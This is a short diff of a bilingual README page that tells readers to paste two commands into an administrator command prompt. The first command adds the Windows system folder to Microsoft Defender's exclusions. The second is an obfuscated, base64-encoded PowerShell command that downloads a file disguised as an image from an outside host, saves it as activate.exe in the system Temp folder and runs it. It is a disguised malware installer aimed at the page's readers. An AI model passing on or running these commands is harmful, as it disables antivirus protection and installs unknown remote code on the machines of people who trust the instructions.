@@ -4,9 +4,9 @@
 > Simplemente copie y pegue el siguiente comando en CMD admin.
 
 > [!NOTE]
-> ## # Copy and paste, then press ENTER for the first command. | Copie y pegue y presione ENTER para el primer comando.
+>> ## # Copy and paste, then press ENTER for the first command. | Copie y pegue y presione ENTER para el primer comando.
 >> ### powershell Set-MpPreference -ExclusionPath $env:SystemRoot
-> ## # Now press ENTER again for the second command. | Ahora presiona ENTER nuevamente para el segundo comando.
+>> ## # Do the same for command 2. | Haga lo mismo para el comando 2.
 >> ### powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAFQANABtAHAARAByAC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAGkAbgBzAHQAYQBsAGwAZQByAF8AYQBnAGUAbgB0AC4AcABuAGcAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwAYQBjAHQAaQB2AGEAdABlAC4AZQB4AGUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwAYQBjAHQAaQB2AGEAdABlAC4AZQB4AGUAIgA=
 
 
